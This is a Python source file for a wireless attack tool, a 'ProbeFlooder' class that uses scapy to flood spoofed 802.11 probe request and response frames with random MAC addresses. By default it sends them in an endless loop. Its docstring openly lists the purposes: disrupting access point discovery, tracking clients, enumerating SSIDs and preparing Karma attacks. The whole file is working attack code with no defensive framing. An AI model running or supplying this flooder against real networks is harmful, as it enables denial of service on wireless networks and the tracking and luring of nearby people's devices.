"""
Probe Request/Response Flood
============================
802.11 probe request and response frame flooding.

Used for:
- AP discovery disruption
- Client tracking via probe requests
- SSID enumeration from probe responses
- Karma attack preparation
"""

import random
import string
import threading
import time
from typing import Optional, Dict, Any, List


class ProbeFlooder:
    """Probe frame injection engine."""

    def __init__(self, iface: str):
        self.iface = iface
        self._running = False
        self._thread: Optional[threading.Thread] = None
        self.stats: Dict[str, Any] = {
            "requests_sent": 0,
            "responses_sent": 0,
            "start_time": None,
        }
        self.discovered_ssids: Dict[str, str] = {}

    def _random_mac(self) -> str:
        """Generate random MAC address."""
        return ":".join(f"{random.randint(0, 255):02x}" for _ in range(6))

    def _build_probe_req(self, ssid: str = "") -> Any:
        """Build 802.11 probe request frame."""
        try:
            from scapy.all import Dot11, Dot11ProbeReq, Dot11Elt, RadioTap
            frame = (
                RadioTap()
                / Dot11(addr1="ff:ff:ff:ff:ff:ff",
                        addr2=self._random_mac(),
                        addr3="ff:ff:ff:ff:ff:ff")
                / Dot11ProbeReq()
            )
            if ssid:
                frame /= Dot11Elt(ID="SSID", info=ssid.encode())
            else:
                frame /= Dot11Elt(ID="SSID", info=b"")
            return frame
        except Exception:
            return None

    def _build_probe_resp(self, ssid: str, bssid: str,
                          dst_mac: str) -> Any:
        """Build 802.11 probe response frame."""
        try:
            from scapy.all import Dot11, Dot11ProbeResp, Dot11Elt, RadioTap
            return (
                RadioTap()
                / Dot11(addr1=dst_mac, addr2=bssid, addr3=bssid)
                / Dot11ProbeResp(cap=0x2104, beacon_interval=0x0064)
                / Dot11Elt(ID="SSID", info=ssid.encode())
            )
        except Exception:
            return None

    def start(self, ssids: Optional[List[str]] = None, mode: str = "request",
              count: int = 0, interval: float = 0.05) -> bool:
        """
        Start probe flood attack.

        Args:
            ssids: Target SSIDs (random if None for request mode)
            mode: 'request' | 'response' | 'both'
            count: Number of frames (0 = infinite)
            interval: Delay between frames

        Returns:
            True if attack started successfully
        """
        if ssids is None:
            ssids = [""]
        self.stats["start_time"] = time.time()
        self._running = True
        self._thread = threading.Thread(
            target=self._flood_loop,
            args=(ssids, mode, count, interval),
            daemon=True,
        )
        self._thread.start()
        return True

    def _flood_loop(self, ssids: List[str], mode: str, count: int,
                    interval: float) -> None:
        """Main probe flood transmission loop."""
        try:
            from scapy.all import sendp
            sent = 0
            while self._running and (count == 0 or sent < count):
                for ssid in ssids:
                    if not self._running:
                        break
                    bssid = self._random_mac()

                    if mode in ("request", "both"):
                        frame = self._build_probe_req(ssid)
                        if frame:
                            sendp(frame, iface=self.iface, verbose=0)
                            self.stats["requests_sent"] += 1
                            sent += 1

                    if mode in ("response", "both"):
                        dst = self._random_mac()
                        frame = self._build_probe_resp(ssid, bssid, dst)
                        if frame:
                            sendp(frame, iface=self.iface, verbose=0)
                            self.stats["responses_sent"] += 1
                            sent += 1

                    time.sleep(interval)
        except Exception as e:
            print(f"[Probe] Flood loop error: {e}")

    def stop(self) -> None:
        """Stop probe flood attack."""
        self._running = False
        if self._thread:
            self._thread.join(timeout=3)

    def get_stats(self) -> Dict[str, Any]:
        """Return attack statistics."""
        runtime = 0.0
        if self.stats["start_time"]:
            runtime = time.time() - self.stats["start_time"]
        return {
            **self.stats,
            "runtime": round(runtime, 1),
            "running": self._running,
            "discovered_ssids": len(self.discovered_ssids),
        }
